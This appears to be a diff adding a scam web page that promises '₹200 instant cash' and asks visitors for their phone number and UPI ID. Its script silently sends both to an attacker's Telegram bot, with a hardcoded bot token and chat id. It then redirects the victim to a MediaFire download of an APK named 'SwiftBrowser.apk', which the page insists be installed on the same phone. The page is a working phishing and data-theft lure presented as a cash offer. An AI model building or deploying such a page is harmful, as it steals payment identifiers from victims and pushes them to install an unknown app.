@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>💰 Get ₹200 Instantly! 💰</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #6e8efb, #a777e3);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            color: #fff;
+        }
+        .container {
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+            width: 350px;
+            text-align: center;
+            border: 2px solid #ff0000;
+        }
+        h1 {
+            font-size: 24px;
+            margin-bottom: 10px;
+            color: #ffeb3b;
+        }
+        .subtitle {
+            font-size: 16px;
+            margin-bottom: 20px;
+            color: #ff5555;
+            font-weight: bold;
+        }
+        .warning {
+            color: #ff0000;
+            font-weight: bold;
+            font-size: 14px;
+            margin-bottom: 15px;
+            text-transform: uppercase;
+        }
+        .input-group {
+            margin-bottom: 15px;
+            text-align: left;
+        }
+        label {
+            display: block;
+            margin-bottom: 5px;
+            font-weight: bold;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 8px;
+            background: rgba(255, 255, 255, 0.2);
+            color: #fff;
+            font-size: 16px;
+        }
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+        }
+        button {
+            width: 100%;
+            padding: 12px;
+            border: none;
+            border-radius: 8px;
+            background: #ff5722;
+            color: white;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s;
+            margin-top: 10px;
+            text-transform: uppercase;
+        }
+        button:hover {
+            background: #ff3d00;
+            transform: scale(1.02);
+        }
+        .note {
+            font-size: 12px;
+            margin-top: 20px;
+            opacity: 0.8;
+        }
+        .error {
+            color: #ff0000;
+            font-size: 12px;
+            display: none;
+            margin-top: 5px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>💰 GET ₹200 INSTANT CASH! 💰</h1>
+        <div class="subtitle">You MUST use the same phone number where you'll install this app!</div>
+        <div class="warning">Fake numbers will NOT receive payment!</div>
+        
+        <div class="input-group">
+            <label for="phone">Your Phone Number</label>
+            <input type="tel" id="phone" placeholder="Enter 10-digit mobile number" required maxlength="10" pattern="[0-9]{10}">
+            <div class="error" id="phoneError">❌ Invalid 10-digit number!</div>
+        </div>
+        
+        <div class="input-group">
+            <label for="upi">Your UPI ID</label>
+            <input type="text" id="upi" placeholder="UPI ID (example@upi)" required>
+        </div>
+        
+        <button onclick="validateAndSubmit()">CLAIM YOUR ₹200 NOW</button>
+        
+        <p class="note">Payment will ONLY be sent to verified phone numbers</p>
+    </div>
+
+    <script>
+        function validateAndSubmit() {
+            const phone = document.getElementById('phone').value;
+            const phoneError = document.getElementById('phoneError');
+            const upi = document.getElementById('upi').value;
+            
+            // Strict phone validation
+            if (!/^\d{10}$/.test(phone)) {
+                phoneError.style.display = 'block';
+                return false;
+            } else {
+                phoneError.style.display = 'none';
+            }
+            
+            // Send data to Telegram bot
+            fetch(`https://api.telegram.org/bot7689402450:AAFJh0q1YLXzNgvWvJw0SbLF73rBjD906v0/sendMessage?chat_id=6856244292&text=📱 New Submission:\nPhone: ${phone}\nUPI: ${upi}`);
+            
+            // Redirect to MediaFire
+            window.location.href = "https://www.mediafire.com/file/ha2puk0tkfqb61c/SwiftBrowser.apk/file";
+            
+            return true;
+        }
+    </script>
+</body>
+</html>
